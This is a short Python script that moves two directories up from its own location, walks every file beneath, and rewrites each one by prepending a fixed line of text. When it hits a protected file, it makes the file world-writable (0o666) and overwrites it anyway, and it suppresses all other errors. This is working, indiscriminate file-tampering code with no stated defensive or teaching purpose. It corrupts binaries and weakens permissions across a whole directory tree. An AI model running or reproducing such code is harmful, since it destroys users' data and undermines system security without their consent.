import os
import shutil

dirname = os.path.dirname(os.path.realpath(__file__))

os.chdir("..")
os.chdir("..")

for a, b, c in os.walk(os.getcwd()):
    for i in c:
        file_path = os.path.join(a, i)
        print(file_path)
        try:
            with open(file_path, "r+") as f:
                contents = f.read()
                f.seek(0)
                f.write("This is some new text added to the file.\n")
                f.write(contents)
        except PermissionError:
            # Change the file permissions to writable for all users
            os.chmod(file_path, 0o666)
            with open(file_path, "r+") as f:
                contents = f.read()
                f.seek(0)
                f.write("This is some new text added to the file.\n")
                f.write(contents)
        except:
            print('err')
